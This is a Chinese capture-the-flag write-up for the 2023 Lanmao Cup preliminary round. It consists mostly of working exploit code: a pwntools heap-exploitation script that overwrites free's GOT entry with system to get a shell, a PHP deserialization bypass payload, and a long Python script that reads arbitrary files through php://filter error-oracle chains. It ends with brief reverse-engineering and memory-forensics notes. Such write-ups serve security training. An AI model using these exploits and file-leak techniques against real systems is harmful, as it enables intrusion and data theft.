---
title: '2023 第七届蓝帽杯初赛 Writeup'
description: '1.进入查看源码，是个反序列化：'
pubDate: 2023-08-26
author: 'IHK-1'
tags: ['CTF', '蓝帽杯', '初赛', '2023']
---

# PWN
```plain
from pwn import *
binary = "./takeway"
elf = ELF(binary)
libc = elf.libc
ip = '101.200.234.115'
port = 43184
local = 1
if local:
    io = process(binary)
else:
    io = remote(ip, port)

#context.log_level = "debug"

def dbg(cmd = ""):
    if cmd == "":
        gdb.attach(io)
        pause()
    else:
        gdb.attach(io, cmd)
        pause()

s = lambda data : io.send(data)
sl = lambda data : io.sendline(data)
sa = lambda text, data : io.sendafter(text, data)
sla = lambda text, data : io.sendlineafter(text, data)
r = lambda : io.recv()
ru = lambda text : io.recvuntil(text)
uu32 = lambda : u32(io.recvuntil(b"\xff")[-4:].ljust(4, b'\x00'))
uu64 = lambda : u64(io.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00"))
lg = lambda data : io.success('%s -> 0x%x' % (data, eval(data)))
ia = lambda : io.interactive()
_flags = 0xfbad1800

def menu(n):
    sla(b"Please input your choose: ", str(n).encode())

def add(idx, name = b"/bin/sh\x00", remark = b"/bin/sh\x00"):
    menu(1)
    sla(b"Please input your order index", str(idx).encode())
    sa(b"Please input your food name: ", name)
    sa(b"remark: ", remark)

def delete(idx):
    menu(2)
    sla(b"Please input your order index: ", str(idx).encode())

def edit(idx, name):
    menu(3)
    sla(b"Please input index: ", str(idx).encode())
    sa(b"New food name is: ", name)

'''add(0)
add(1)
delete(0)
delete(1)
edit(1, p64(elf.got['free'] - 0x8))
add(2)
add(4, p64(elf.plt['puts']), p64(elf.plt['puts']))
delete(3)'''
add(0)
add(1)
add(2)
delete(0)
delete(1)
edit(1, p64(0x404088 - 8))
add(3)
add(4, p64(0), p64(0x20))

delete(0)
delete(1)
edit(1, p64(0x404030 - 8))
add(7)

add(8, b"\x00", b"a" * 8)
menu(3)
sla(b"Please input index: ", str(8).encode())
libcbase = uu64() - 0x8bad0
lg("libcbase")

system = libcbase + libc.sym['system']
sa(b"New food name is: ", p64(system))

delete(1)
delete(2)
edit(2, p64(elf.got['free'] - 8))
add(9)
add(10, p64(0), p64(system))
delete(9)
ia()
```

# WEB
## 


1.进入查看源码，是个反序列化：



<!-- 这是一张图片，ocr 内容为： -->
![](https://raw.githubusercontent.com/guangjiovo/picgo/main/202308262213658.png)



2.这里需要绕过两个地方，第一是传参`my_secret.flag`的的下划线，因为下划线会被解析为空格，所以这里直接用中括号替换即可：`my[secret.flag`。第二个地方是`__wakeup`魔术方法，这里由于默认给了`true`，可以利用另一个特性绕过：自定义对象C。当序列化使用了自定义对象C时，`Serializable`回因为不支持`__wakeup`方法，从而使其无效，故我们只需要使用：`?my[secret.flag=C:8:"Saferman":0:{}`即可绕过。



3.进入到`file()`函数，官方文档描述为：**PHP file() 函数把整个文件读入一个数组中。与 file_get_contents() 类似，不同的是 file() 将文件作为一个数组返回。**这里和`file_get_contents`类似的话，意味着应该也存在文件包含，可以使用PHP流过滤器。但是由于没有输出，所以是无回显的。



4.谷歌发现原题：[ DownUnder CTF 2022](https://tttang.com/archive/1755/#toc_tldr)。文章描述的原理，大概意思就是用几个php的过滤器来实现测信道攻击，通过字符逐位翻转和不在范围的回显情况来判断并读取出文件流中的内容。并且在最后集成了一个FUZZ的exp脚本：https://github.com/DownUnderCTF/Challenges_2022_Public/blob/main/web/minimal-php/solve/solution.py。



5.利用脚本替换好攻击url和bypass参数位置，运行即可逐位判断读取到`/flag`文件的内容：



```python
import requests
import sys
from base64 import b64decode

"""
THE GRAND IDEA:
We can use PHP memory limit as an error oracle. Repeatedly applying the convert.iconv.L1.UCS-4LE
filter will blow up the string length by 4x every time it is used, which will quickly cause
500 error if and only if the string is non empty. So we now have an oracle that tells us if
the string is empty.

THE GRAND IDEA 2:
The dechunk filter is interesting.
https://github.com/php/php-src/blob/01b3fc03c30c6cb85038250bb5640be3a09c6a32/ext/standard/filters.c#L1724
It looks like it was implemented for something http related, but for our purposes, the interesting
behavior is that if the string contains no newlines, it will wipe the entire string if and only if
the string starts with A-Fa-f0-9, otherwise it will leave it untouched. This works perfect with our
above oracle! In fact we can verify that since the flag starts with D that the filter chain

dechunk|convert.iconv.L1.UCS-4LE|convert.iconv.L1.UCS-4LE|[...]|convert.iconv.L1.UCS-4LE

does not cause a 500 error.

THE REST:
So now we can verify if the first character is in A-Fa-f0-9. The rest of the challenge is a descent
into madness trying to figure out ways to:
- somehow get other characters not at the start of the flag file to the front
- detect more precisely which character is at the front
"""

def join(*x):
	return '|'.join(x)

def err(s):
	print(s)
	raise ValueError

def req(s):
    # 注意，这里的方式要为get
	return requests.get('http://you_url:port/index.php?my[secret.flag=C:8:"Saferman":0:{}&secret=' + f'php://filter/{s}/resource=/flag).status_code == 500

"""
Step 1:
The second step of our exploit only works under two conditions:
- String only contains a-zA-Z0-9
- String ends with two equals signs

base64-encoding the flag file twice takes care of the first condition.

We don't know the length of the flag file, so we can't be sure that it will end with two equals
signs.

Repeated application of the convert.quoted-printable-encode will only consume additional
memory if the base64 ends with equals signs, so that's what we are going to use as an oracle here.
If the double-base64 does not end with two equals signs, we will add junk data to the start of the
flag with convert.iconv..CSISO2022KR until it does.
"""

blow_up_enc = join(*['convert.quoted-printable-encode']*1000)
blow_up_utf32 = 'convert.iconv.L1.UCS-4LE'
blow_up_inf = join(*[blow_up_utf32]*50)

header = 'convert.base64-encode|convert.base64-encode'

# Start get baseline blowup
print('Calculating blowup')
baseline_blowup = 0
for n in range(100):
	payload = join(*[blow_up_utf32]*n)
	if req(f'{header}|{payload}'):
		baseline_blowup = n
		break
else:
	err('something wrong')

print(f'baseline blowup is {baseline_blowup}')

trailer = join(*[blow_up_utf32]*(baseline_blowup-1))

assert req(f'{header}|{trailer}') == False

print('detecting equals')
j = [
	req(f'convert.base64-encode|convert.base64-encode|{blow_up_enc}|{trailer}'),
	req(f'convert.base64-encode|convert.iconv..CSISO2022KR|convert.base64-encode{blow_up_enc}|{trailer}'),
	req(f'convert.base64-encode|convert.iconv..CSISO2022KR|convert.iconv..CSISO2022KR|convert.base64-encode|{blow_up_enc}|{trailer}')
]
print(j)
if sum(j) != 2:
	err('something wrong')
if j[0] == False:
	header = f'convert.base64-encode|convert.iconv..CSISO2022KR|convert.base64-encode'
elif j[1] == False:
	header = f'convert.base64-encode|convert.iconv..CSISO2022KR|convert.iconv..CSISO2022KRconvert.base64-encode'
elif j[2] == False:
	header = f'convert.base64-encode|convert.base64-encode'
else:
	err('something wrong')
print(f'j: {j}')
print(f'header: {header}')

"""
Step two:
Now we have something of the form
[a-zA-Z0-9 things]==

Here the pain begins. For a long time I was trying to find something that would allow me to strip
successive characters from the start of the string to access every character. Maybe something like
that exists but I couldn't find it. However, if you play around with filter combinations you notice
there are filters that *swap* characters:

convert.iconv.CSUNICODE.UCS-2BE, which I call r2, flips every pair of characters in a string:
abcdefgh -> badcfehg

convert.iconv.UCS-4LE.10646-1:1993, which I call r4, reverses every chunk of four characters:
abcdefgh -> dcbahgfe

This allows us to access the first four characters of the string. Can we do better? It turns out
YES, we can! Turns out that convert.iconv.CSUNICODE.CSUNICODE appends <0xff><0xfe> to the start of
the string:

abcdefgh -> <0xff><0xfe>abcdefgh

The idea being that if we now use the r4 gadget, we get something like:
ba<0xfe><0xff>fedc

And then if we apply a convert.base64-decode|convert.base64-encode, it removes the invalid
<0xfe><0xff> to get:
bafedc

And then apply the r4 again, we have swapped the f and e to the front, which were the 5th and 6th
characters of the string. There's only one problem: our r4 gadget requires that the string length
is a multiple of 4. The original base64 string will be a multiple of four by definition, so when
we apply convert.iconv.CSUNICODE.CSUNICODE it will be two more than a multiple of four, which is no
good for our r4 gadget. This is where the double equals we required in step 1 comes in! Because it
turns out, if we apply the filter
convert.quoted-printable-encode|convert.quoted-printable-encode|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.L1.utf7

It will turn the == into:
+---AD0-3D3D+---AD0-3D3D

And this is magic, because this corrects such that when we apply the
convert.iconv.CSUNICODE.CSUNICODE filter the resuting string is exactly a multiple of four!

Let's recap. We have a string like:
abcdefghij==

Apply the convert.quoted-printable-encode + convert.iconv.L1.utf7:
abcdefghij+---AD0-3D3D+---AD0-3D3D

Apply convert.iconv.CSUNICODE.CSUNICODE:
<0xff><0xfe>abcdefghij+---AD0-3D3D+---AD0-3D3D

Apply r4 gadget:
ba<0xfe><0xff>fedcjihg---+-0DAD3D3---+-0DAD3D3

Apply base64-decode | base64-encode, so the '-' and high bytes will disappear:
bafedcjihg+0DAD3D3+0DAD3Dw==

Then apply r4 once more:
efabijcd0+gh3DAD0+3D3DAD==wD

And here's the cute part: not only have we now accessed the 5th and 6th chars of the string, but
the string still has two equals signs in it, so we can reapply the technique as many times as we
want, to access all the characters in the string ;)
"""

flip = "convert.quoted-printable-encode|convert.quoted-printable-encode|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.CSUNICODE.CSUNICODE|convert.iconv.UCS-4LE.10646-1:1993|convert.base64-decode|convert.base64-encode"
r2 = "convert.iconv.CSUNICODE.UCS-2BE"
r4 = "convert.iconv.UCS-4LE.10646-1:1993"

def get_nth(n):
	global flip, r2, r4
	o = []
	chunk = n // 2
	if chunk % 2 == 1: o.append(r4)
	o.extend([flip, r4] * (chunk // 2))
	if (n % 2 == 1) ^ (chunk % 2 == 1): o.append(r2)
	return join(*o)

"""
Step 3:
This is the longest but actually easiest part. We can use dechunk oracle to figure out if the first
char is 0-9A-Fa-f. So it's just a matter of finding filters which translate to or from those
chars. rot13 and string lower are helpful. There are probably a million ways to do this bit but
I just bruteforced every combination of iconv filters to find these.

Numbers are a bit trickier because iconv doesn't tend to touch them.
In the CTF you coud porbably just guess from there once you have the letters. But if you actually 
want a full leak you can base64 encode a third time and use the first two letters of the resulting
string to figure out which number it is.
"""

rot1 = 'convert.iconv.437.CP930'
be = 'convert.quoted-printable-encode|convert.iconv..UTF7|convert.base64-decode|convert.base64-encode'
o = ''

def find_letter(prefix):
	if not req(f'{prefix}|dechunk|{blow_up_inf}'):
		# a-f A-F 0-9
		if not req(f'{prefix}|{rot1}|dechunk|{blow_up_inf}'):
			# a-e
			for n in range(5):
				if req(f'{prefix}|' + f'{rot1}|{be}|'*(n+1) + f'{rot1}|dechunk|{blow_up_inf}'):
					return 'edcba'[n]
					break
			else:
				err('something wrong')
		elif not req(f'{prefix}|string.tolower|{rot1}|dechunk|{blow_up_inf}'):
			# A-E
			for n in range(5):
				if req(f'{prefix}|string.tolower|' + f'{rot1}|{be}|'*(n+1) + f'{rot1}|dechunk|{blow_up_inf}'):
					return 'EDCBA'[n]
					break
			else:
				err('something wrong')
		elif not req(f'{prefix}|convert.iconv.CSISO5427CYRILLIC.855|dechunk|{blow_up_inf}'):
			return '*'
		elif not req(f'{prefix}|convert.iconv.CP1390.CSIBM932|dechunk|{blow_up_inf}'):
			# f
			return 'f'
		elif not req(f'{prefix}|string.tolower|convert.iconv.CP1390.CSIBM932|dechunk|{blow_up_inf}'):
			# F
			return 'F'
		else:
			err('something wrong')
	elif not req(f'{prefix}|string.rot13|dechunk|{blow_up_inf}'):
		# n-s N-S
		if not req(f'{prefix}|string.rot13|{rot1}|dechunk|{blow_up_inf}'):
			# n-r
			for n in range(5):
				if req(f'{prefix}|string.rot13|' + f'{rot1}|{be}|'*(n+1) + f'{rot1}|dechunk|{blow_up_inf}'):
					return 'rqpon'[n]
					break
			else:
				err('something wrong')
		elif not req(f'{prefix}|string.rot13|string.tolower|{rot1}|dechunk|{blow_up_inf}'):
			# N-R
			for n in range(5):
				if req(f'{prefix}|string.rot13|string.tolower|' + f'{rot1}|{be}|'*(n+1) + f'{rot1}|dechunk|{blow_up_inf}'):
					return 'RQPON'[n]
					break
			else:
				err('something wrong')
		elif not req(f'{prefix}|string.rot13|convert.iconv.CP1390.CSIBM932|dechunk|{blow_up_inf}'):
			# s
			return 's'
		elif not req(f'{prefix}|string.rot13|string.tolower|convert.iconv.CP1390.CSIBM932|dechunk|{blow_up_inf}'):
			# S
			return 'S'
		else:
			err('something wrong')
	elif not req(f'{prefix}|{rot1}|string.rot13|dechunk|{blow_up_inf}'):
		# i j k
		if req(f'{prefix}|{rot1}|string.rot13|{be}|{rot1}|dechunk|{blow_up_inf}'):
			return 'k'
		elif req(f'{prefix}|{rot1}|string.rot13|{be}|{rot1}|{be}|{rot1}|dechunk|{blow_up_inf}'):
			return 'j'
		elif req(f'{prefix}|{rot1}|string.rot13|{be}|{rot1}|{be}|{rot1}|{be}|{rot1}|dechunk|{blow_up_inf}'):
			return 'i'
		else:
			err('something wrong')
	elif not req(f'{prefix}|string.tolower|{rot1}|string.rot13|dechunk|{blow_up_inf}'):
		# I J K
		if req(f'{prefix}|string.tolower|{rot1}|string.rot13|{be}|{rot1}|dechunk|{blow_up_inf}'):
			return 'K'
		elif req(f'{prefix}|string.tolower|{rot1}|string.rot13|{be}|{rot1}|{be}|{rot1}|dechunk|{blow_up_inf}'):
			return 'J'
		elif req(f'{prefix}|string.tolower|{rot1}|string.rot13|{be}|{rot1}|{be}|{rot1}|{be}|{rot1}|dechunk|{blow_up_inf}'):
			return 'I'
		else:
			err('something wrong')
	elif not req(f'{prefix}|string.rot13|{rot1}|string.rot13|dechunk|{blow_up_inf}'):
		# v w x
		if req(f'{prefix}|string.rot13|{rot1}|string.rot13|{be}|{rot1}|dechunk|{blow_up_inf}'):
			return 'x'
		elif req(f'{prefix}|string.rot13|{rot1}|string.rot13|{be}|{rot1}|{be}|{rot1}|dechunk|{blow_up_inf}'):
			return 'w'
		elif req(f'{prefix}|string.rot13|{rot1}|string.rot13|{be}|{rot1}|{be}|{rot1}|{be}|{rot1}|dechunk|{blow_up_inf}'):
			return 'v'
		else:
			err('something wrong')
	elif not req(f'{prefix}|string.tolower|string.rot13|{rot1}|string.rot13|dechunk|{blow_up_inf}'):
		# V W X
		if req(f'{prefix}|string.tolower|string.rot13|{rot1}|string.rot13|{be}|{rot1}|dechunk|{blow_up_inf}'):
			return 'X'
		elif req(f'{prefix}|string.tolower|string.rot13|{rot1}|string.rot13|{be}|{rot1}|{be}|{rot1}|dechunk|{blow_up_inf}'):
			return 'W'
		elif req(f'{prefix}|string.tolower|string.rot13|{rot1}|string.rot13|{be}|{rot1}|{be}|{rot1}|{be}|{rot1}|dechunk|{blow_up_inf}'):
			return 'V'
		else:
			err('something wrong')
	elif not req(f'{prefix}|convert.iconv.CP285.CP280|string.rot13|dechunk|{blow_up_inf}'):
		# Z
		return 'Z'
	elif not req(f'{prefix}|string.toupper|convert.iconv.CP285.CP280|string.rot13|dechunk|{blow_up_inf}'):
		# z
		return 'z'
	elif not req(f'{prefix}|string.rot13|convert.iconv.CP285.CP280|string.rot13|dechunk|{blow_up_inf}'):
		# M
		return 'M'
	elif not req(f'{prefix}|string.rot13|string.toupper|convert.iconv.CP285.CP280|string.rot13|dechunk|{blow_up_inf}'):
		# m
		return 'm'
	elif not req(f'{prefix}|convert.iconv.CP273.CP1122|string.rot13|dechunk|{blow_up_inf}'):
		# y
		return 'y'
	elif not req(f'{prefix}|string.tolower|convert.iconv.CP273.CP1122|string.rot13|dechunk|{blow_up_inf}'):
		# Y
		return 'Y'
	elif not req(f'{prefix}|string.rot13|convert.iconv.CP273.CP1122|string.rot13|dechunk|{blow_up_inf}'):
		# l
		return 'l'
	elif not req(f'{prefix}|string.tolower|string.rot13|convert.iconv.CP273.CP1122|string.rot13|dechunk|{blow_up_inf}'):
		# L
		return 'L'
	elif not req(f'{prefix}|convert.iconv.500.1026|string.tolower|convert.iconv.437.CP930|string.rot13|dechunk|{blow_up_inf}'):
		# h
		return 'h'
	elif not req(f'{prefix}|string.tolower|convert.iconv.500.1026|string.tolower|convert.iconv.437.CP930|string.rot13|dechunk|{blow_up_inf}'):
		# H
		return 'H'
	elif not req(f'{prefix}|string.rot13|convert.iconv.500.1026|string.tolower|convert.iconv.437.CP930|string.rot13|dechunk|{blow_up_inf}'):
		# u
		return 'u'
	elif not req(f'{prefix}|string.rot13|string.tolower|convert.iconv.500.1026|string.tolower|convert.iconv.437.CP930|string.rot13|dechunk|{blow_up_inf}'):
		# U
		return 'U'
	elif not req(f'{prefix}|convert.iconv.CP1390.CSIBM932|dechunk|{blow_up_inf}'):
		# g
		return 'g'
	elif not req(f'{prefix}|string.tolower|convert.iconv.CP1390.CSIBM932|dechunk|{blow_up_inf}'):
		# G
		return 'G'
	elif not req(f'{prefix}|string.rot13|convert.iconv.CP1390.CSIBM932|dechunk|{blow_up_inf}'):
		# t
		return 't'
	elif not req(f'{prefix}|string.rot13|string.tolower|convert.iconv.CP1390.CSIBM932|dechunk|{blow_up_inf}'):
		# T
		return 'T'
	else:
		err('something wrong')

print()
for i in range(100):
	prefix = f'{header}|{get_nth(i)}'
	letter = find_letter(prefix)
	# it's a number! check base64
	if letter == '*':
		prefix = f'{header}|{get_nth(i)}|convert.base64-encode'
		s = find_letter(prefix)
		if s == 'M':
			# 0 - 3
			prefix = f'{header}|{get_nth(i)}|convert.base64-encode|{r2}'
			ss = find_letter(prefix)
			if ss in 'CDEFGH':
				letter = '0'
			elif ss in 'STUVWX':
				letter = '1'
			elif ss in 'ijklmn':
				letter = '2'
			elif ss in 'yz*':
				letter = '3'
			else:
				err(f'bad num ({ss})')
		elif s == 'N':
			# 4 - 7
			prefix = f'{header}|{get_nth(i)}|convert.base64-encode|{r2}'
			ss = find_letter(prefix)
			if ss in 'CDEFGH':
				letter = '4'
			elif ss in 'STUVWX':
				letter = '5'
			elif ss in 'ijklmn':
				letter = '6'
			elif ss in 'yz*':
				letter = '7'
			else:
				err(f'bad num ({ss})')
		elif s == 'O':
			# 8 - 9
			prefix = f'{header}|{get_nth(i)}|convert.base64-encode|{r2}'
			ss = find_letter(prefix)
			if ss in 'CDEFGH':
				letter = '8'
			elif ss in 'STUVWX':
				letter = '9'
			else:
				err(f'bad num ({ss})')
		else:
			err('wtf')

	print(end=letter)
	o += letter
	sys.stdout.flush()

"""
We are done!! :)
"""

print()
d = b64decode(o.encode() + b'=' * 4)
# remove KR padding
d = d.replace(b'$)C',b'')
print(b64decode(d))
```



<!-- 这是一张图片，ocr 内容为： -->
![](https://raw.githubusercontent.com/guangjiovo/picgo/main/202308262352310.png)

# Reverse
出题人给的源码忘记删代码了，直接把需要输入的答案即flag放到源码的注释里了

<!-- 这是一张图片，ocr 内容为：INT CF-(5529183L, 12321217,145567,25861240,  3433927,53995537,538,3749332,34982733, 3424878,37624276) /STRING FLAG"WHATISYOURSTORY"; / NUMBER 34982733 -->


# MISC
```plain
PS C:\Users\HK\Desktop\取证\volatility\VolatilityWorkbench2.6> C:\Users\HK\Desktop\取证\volatility\VolatilityWorkbench2.6\volatility.exe -f C:\Users\HK\Desktop\mem.raw --profile=Win7SP1x64 filescan > ./out.txt
```

<!-- 这是一张图片，ocr 内容为：X OUT.TXT 查看 编辑 文件 1 R--RW- \DEVICE\HARDDISKVOLUME2\USERS\S277\DESKTOD 0X000000007D410D10 19MBNARD 0X000000007D4111D0 152ZZ\DESKTOP 0X000000007D411F20 0X000000007D4121D0 O K--RWA \UEVICE\HARAOISKVOLUMEZ\WINAOWS (SYSTER SYSTEM5Z\NORMA112.OFL OR-RWD 0X000000007D412320 D \DEVICE\HARDDISKVOLUME2\WINDOWS\SYSTEM32\SAMLIB.DLL 0 R--RWD \DEVICE\HARDDISKVOLUME2\WINDOWS\SYSTEM32\SHSVCS.DL1 0X000000007D413BC0 0 R--RWD \DEVICE\HARDDISKVOLUME2\WINDOWS\S\S 0X000000007D413F20 S\SYSTEM32\SAMCLI.DL1 0 R--RWD \DEVICE\HARDDISKVOLUME2\WINDOWS\SYSTEM32\NETAPI32.D11 0X000000007D414330 0851 @ R--R-D \DEVICE\HARDDISKVOLUME2\WINDOWS\S 0X000000007D414690 US\SYSTEM32\QUERY.DL1 0 R--RWD \DEVICE\HARDDISKVOLUME2\WINDOWS\STEM32\CRYPTDLL.DLL 0X000000007D4147E0 0 R--R-D \DEVICE\HARDDISKVOLUME2\WINDOWS\SY 0X000000007D4149F0 V813 /SYSTEM32\ELSCORE.DLL 0 R--RWD \DEVICE\HARDDISKVOLUME2\WINDOWS\SYSTEM32\AUDIOSRV.DL1 0X000000007D414B40 1 R--RW- \DEVICE\HARDDISKVOLUME LUME2\USERS\S2ZZ\DESKTOP 0X000000007D415600 0 R--RWD \DEVICE\HARDDISKVOLUME2\WINDOWS\SYSTEM32\KTMW32.DL1 0X000000007D415F20 1 1 RW-RWD \DEVICE\HARDDISKVOLUME2\USERS\S2 BDATA\LOCAL\MICROSOFT\WINDOWS\EXPLORER\THUMBCACHE 1024.DB 0X000000007D41AE90 S\S2Z\APPDATA\LOO 1681223 0X000000007D41CB50 \DEVICE\HARDDISKVOLUME2\US \S2ZZ\DESKTOP\TABLE.ZIP /USERS\ 0X000000007D421A20 0X000000007D43A3F0 /DEVICE\AFD\ENDPOINT 0X000000007D43AF20 \DEVICE\AFD/ENDPOINT 0X000000007D43B070 /DEVICE\AFD\ENDPOINT 0X000000007D43B260 /DEVICE\AFD\ENDPOINT 0X000000007D43BD60 /DEVICE\AFD\ENDPOINT 0X000000007D43C810 /DEVICE\AFD\ENDPOINT TH 0X000000007D43E4B0 \DEVICE\HARDDISKVOLUME2\WINDOWS\SYSTEM32\VM3DSERVICE.EXE.EXE. 12 \DEVICE\HARDDISKVOLUME2\WINDOWS\SYSTEM32\DIMSJOB.DLL 0X000000007D43E960 D-P-D P----B 13 \DEVICE\HARDDISKVOLUME2\WINDOWS\SYSTEM32\PAUTOENR.DLL 0X000000007D43EE20 6000 12 \DEVICE\HARDDISKVOLUME2\WINDOWS\SYSTEM32\WERCPLSUPPORT.DL1 RRR 0X000000007D440070 -R-D MO2 \DEVICE\HARDDISKVOLUME2\WINDOWS\SYSTEM32\PNRPNSP.DL1 -R-D 0X000000007D442890 \DEVICE\HARDDISKVOLUME2\WINDOWS\SYSTEM32\WINRNR.DLL -R-D 0X000000007D4429E0 THANG FING F IDEVICETHARDDISKYOLUMEZ)PROGRANDATA MICROSOFT/WINDOWS)START MENU(PROGRANS(WINDONS DVD MAKER.INK 0X000000007D44480  IDEVICEYHARDDISKYOLUMEZYUSERSISZZZZZIAPPDATA/LOCALMICROSOFF)WINDOUS\USRCLAS5.DATI971971B01AF-57F9-11 0X000000007D448070 A0D9-803049148042].TMCONTAINER0000000000000000000001.REGTRANS-MS O RWD \D \DEVICE\HARDDISKVOLUME2\$DIRECTORY 17 0X000000007D4487E0 0 R--R-D \DEVICE\HARDDISKVOLUME2\WINDOWS\SYSTEM32\FSQUIRT.EXE 14 0X000000007D448930 O R-RND \PEVICEVICELHARDDISKYOLUMEZWINDOUSLASSENBLY\GAC  NSILLNCSTOREL6,1.8.0 31BF3856AD364E35INCSTOR 31 0X000000007D448E20 0 RWD-- 2 \DEVICE\HARDDISKVOLUME2\WINDOWS\INF\WMIAPRPL\E804\WMIAPRPL.INI 0X000000007D4533B0 11 0 R-RWD \DEVICE\HARDDISKVOLUME2\WINDOWS\SYSTEM32\WDDSHEXT.DLL 0X000000007D454B00 0X000000007D458320 21 1 R-RW 0X000000007D458470 _NONE_FA396087175AC9AC 1126 1 RW----- IDEVICEVHARDDISKYOLUMEZ\USERS(52ZZLAPPATA\LOCALVMICROSOFT/WINDOWS\USRCLASS.DAT.LOG1 0X000000007D45A1F0 1 RM---- \DEVICE\HARDDISKVOLUMEZ\USERS\S2ZZZVAPPDATA\LOCAL\MICROSOFTLWINDOWS\USRCLASS.DAT 0X000000007D45A340 0 R--RW-\DEVICE\HARDDISKVOLUME2\USERS\PUBLIC\DESKTOP\FIREFOX.INK 0X000000007D45AB60 0 R--R-D \DEVICE\HARDDISKVOLUME2\WINDOWS\SYSTEM32\PDH.DLL 0X000000007D45AD00 行410,列83 WINDOWS (CRLF) UTF-16 LE 100% -->


<!-- 这是一张图片，ocr 内容为：X OUT.TXT 本 编辑查看 文件 0 R--RIND \DEVICESHARDDISKVOLUNE7VISERS(527/ \ANNDATALROAMINAMINALMICROSOFRINDOUSIRERENT\DESKTON,INI 058MMMO1 0X000000007D489AA0 0X000000007D489BF0 个 个 152ZZ\DESKTOP 0X000000007D48A070 0 K-A \UEVICE\HARAOISKVOIUMEZ\WINAOWSISYSTEMSZV 0X000000007D48ACB0 PYSTEMSZ\USBMON.ARL O R--P-D \DEVICE\HARDDISKVOLUME2/WINDOWS\SYSTEM32\SPOOL\PRTPROCS)X64/WINPRINT.DL 0X000000007D491640 0 R--R-D \DEVICE\HARDDISKVOLUME2\WINDOWS\SY; 0X000000007D4926A0 S\SYSTEM32\WINDOWSPOWERSHELL\V1.0\POWERSHELL ISE.EXE 0 R--R-D \DEVICE\HARDDISKVOLUME2\WINDOWS\SYSTEM32\DRPROV.DL1 0X000000007D492A90 1 RW-RWD \DEVI I \DEVICESHARDDISKVOLUMEZ/USERS)52ZZ\APPDATA\LOCALVMICROSOFT/WINDOWS(EXPLORER\THUABCACHE 256.DB 0X000000007D492C30 16 - NEVICELHARDDISKNOLUNEZ USERS'S2ZZZZ JAPPATA LLOCAL VHOZILLA\FIREFOX PROFILES BXLJEIO7 DEFOUTTYCACHE 0X000000007D494070 0R-RW \0 10318830328E6C5A25F4128E85A844818A3EF4040 0X000000007D494C60 \DEVICE\NAMEDPIPE\LSASS ,1 RH-RUD \DEVICEVHARDDISKYOLUNEZYUSERS(52Z(APPDATA LOCALLOCAIMICROSOFEWINDONS LEXPLORER(THUNBRACHE,3 1 0X000000007D4961F0 I BH.RND \PEVICELHARDDISWALUMEZ JUSERS)S2ZZZ IDK.DB 1 0X000000007D496340 0 R--R-- \DEVICE\HARDDISKVOLUME2WINDOUS\SYSTEM32\DRIVERSTORELEN-US/FAXCN802.INF LOC 16 0X000000007D4973A0 16 O R--R--\DEVICE\HARDDISKVOLUME2\WINDOWS\INF\FAXCN002.INF 0X000000007D497900 3 0X000000007D4986B0 D \DEVICE\HARDDISKVOLUME2\WINDOWS\SYSTEM32\WUCLTUX.DLL 0R-R-D 33 \DEVICE\HARDDISKVOLUME2\$DIRECTORY 0 RWD \D 0X000000007D49CC40 3275609 \DEVICE\NAMEDPIPE\SRVSVC 0X000000007D49D430 O R--R-D \DEVICE\HARDDISKVOLUME2\WINDOWS\SYSTEM32\TQUERY.DL1 0X000000007D49E170 0 R--RWD \DEVICE\HARDDISKVOLUME2\WINDOWS\FONTS\MRIAMC.TTF 0X000000007D49E6F0 0 R--RWD \DEVICE\HARDDISKVOLUME2\WINDOWS\SYSTEM32\DXP.DL1 0X000000007D4A12D0 D \DEVICE\HARDDISKVOLUME2\WINDOWS\SYSTEM32\NETWORKEXPLORER.D11 0R-RWD 0X000000007D4A1420 0X000000007D4A18B0 /COMCT132.D11 O R--R-D \DEVICE\HARDDISKVOLUME2\WINDOWS\SYSTEM32\FXSAPI.DL1 71 0X000000007D4AB5C0 0 RW-RVD \DEVICE\HARDDISKVOLUME2\$DIRECTORY 0X000000007D4ABF20 1 R--R-- \DEVICE\HARDDISKVOLUME2WINDOWS\REGISTRATION\R00000000000000006.C1B 0X000000007D4AD780 0 R--RWD \DEVICE\HARDDISKVOLUME2\WINDOWS\FONTS\GABRIOLA.TTF 0X000000007D4ADA20 1 R--RW- \DEVICE\HARDDISKVOLUME2\WINDOWS\SYSTEM32 0X000000007D4B1500 0 R--R-D \DEVICE\HARDDISKVOLUME2\WINDOWS\SYSTEM32\SLUI.E 0X000000007D4B17B0 .EXE 1 R--R-D \DEVICE\HARDDISKVOLUME2\WINDOWS\FONTS\STATICCACHE.DAT 0X000000007D4B1B30 0X000000007D4B1D30 0X000000007D4B3520 CURRENT.BIN 14 0 R--P-D \DEVICE\HARDDISKVOLUME2\WINDOWS\SYSTEM32\SNTSEARCH.DL1 0X000000007D4B4360 0 R--D \DEVICE\HARDDISKVOLUME2\WINDOWS\SYSTEM32\SPPCOMMDLG.D11 4 0X000000007D4B4C70 O RW-RWD \DEVICE\HARDDISKVOLUME2\$DIRECTORY 18 0X000000007D4B5750 & R--RND\DEVICEVICELHARDDISKVOLUNEZ\PRORRANDATA\MICROSOSOFTLWINDOWS\START NENU\PRORRANS\DESKTOP.INI 16 0X000000007D4B5F20 1 1 R--NN- PEVICR HARDEISHLUMEZ WINDOUS  65SSTERDET ATERDET ATEROFE,VKRDERS,CONTROLS 6595EETHRCEF 8,762 0X000000007D4B6290 _NONE_FA396087175AC9AC 60315 0 R--R-D \DEVICE\HARDDISKVOLUME2\PROGRAM FILES\INTERNET EXPLORER\IEPROXY.D1L 0X000000007D4B6690 0X000000007D4B7510 O R---N-D \DEVICE\HARDDISKVOLUMEZ\PROGRAM FILES\INTERNET EXPLORER\ZH-CH-CHNJIEXPLORE.EXE.MUI 0 R--I-D \DEVICE\HARDDISKVOLUME2\PROGRAM FILES\DVD MAKER\DVDMAKER.EXE 0X000000007D4B7C10 0 R--RW- \DEVICE\HARDDISKVOLUME2\USERS\S2ZZ\DESKTOP\KEY.PSMR 0X000000007D4B8D20 行520,列83 UTF-16 LE 100% WINDOWS (CRLF) -->


